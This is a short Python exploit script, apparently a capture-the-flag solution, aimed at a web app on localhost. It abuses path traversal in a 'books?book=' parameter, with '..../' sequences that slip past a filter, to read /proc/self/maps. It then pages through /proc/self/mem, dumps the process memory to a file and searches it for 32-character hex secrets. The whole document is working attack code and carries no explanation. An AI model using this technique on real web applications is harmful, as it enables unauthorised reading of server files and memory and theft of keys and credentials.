import requests, re

url = "http://127.0.0.1:8088/"
maps_url = f"{url}/books?book=..../..../..../..../..../..../....//proc/self/maps"
maps_reg = "([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0"
maps = re.findall(maps_reg, requests.get(maps_url).text)
# print(maps)
# for i in range(100000,9999999999):
#     xx = str(139669249458176/i)
#     f = xx.split(".")[1]
#     if len(f)==1 and f=='0':
#         print(i)
#         exit()

# exit();

def find_i(chu):
    for i in range(5000,100000000):
        xx = str(chu/i)
        f = xx.split(".")[1]
        if len(str(f))==1 and f=='0':
            return int(i)
    return 1

iii = 0;
for m in maps:
    with open ('mem.txt','ab') as f:
            
        ret = ""
        start, end = m.split("-")[0], m.split("-")[1]
        # Length = int((int(end, 16) - int(start, 16)))
        start = int(start,16)
        end = int(end,16)
        

        while start < end:
            Length = find_i(start)
            Offset = int(start/Length)
            # print(Offset,Length)
            
            read_url = f"{url}/books?book=..../..../..../..../..../..../....//proc/self/mem&page={Offset+1}&page_size={Length}"
            s = requests.get(read_url)
            if s.status_code==200:
                f.write(s.content)
                
                txt = re.sub('\\\\x..','',s.text)
                rt = re.findall("[a-f0-9]{32}",txt)
                if rt:
                    print(rt)
                iii+=1
                start+=Length
                while start < end:
                    Length = find_i(start)
                    if Length==1:
                        start+=5000
                    else:
                        break

                Offset = int(start/Length)
            else:
                break


# def find_key(txt):
#     txt = re.sub('\\\\x..','',txt)
#     rt = re.findall("[a-f0-9]{32}",txt)
#     print(rt)
#     pass

# with open ('mem.txt','r') as f:
#     txt = f.read()

# find_key(txt)
# exit()
